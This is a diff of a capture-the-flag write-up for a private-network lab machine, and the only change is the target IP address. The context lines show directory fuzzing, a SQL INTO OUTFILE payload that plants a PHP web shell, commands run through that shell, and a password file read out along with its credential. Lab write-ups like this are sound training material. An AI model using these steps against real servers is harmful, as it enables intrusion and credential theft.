@@ -159,7 +159,7 @@ Alias /webmail /usr/share/squirrelmail
 ```
 Reading files was actually limited and writing files was even more difficult. After enumerating more on the `/forum` we find a directory:  
 ```
-ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://192.168.56.112/forum/FUZZ -fs 288
+ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://192.168.56.114/forum/FUZZ -fs 288
 ...
 templates_c             [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 4ms]
 ...
@@ -171,13 +171,13 @@ SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c
 ```
 Making a request to the script should execute it:
 ```
-https://192.168.56.112/forum/templates_c/script.php?cmd=whoami
+https://192.168.56.114/forum/templates_c/script.php?cmd=whoami
 ```
 It works ! We have now a Remote Code Excution on the machine. </br>
 
 The next step is to found interesting files on the machine. And In the `/home` directory we found the folder `LOOKATME` containing the file `password`:
 ```
-https://192.168.56.112/forum/templates_c/script.php?cmd=cat%20/home/LOOKATME/password
+https://192.168.56.114/forum/templates_c/script.php?cmd=cat%20/home/LOOKATME/password
 ...
 lmezard:G!@M6f4Eatau{sF" 
 ```
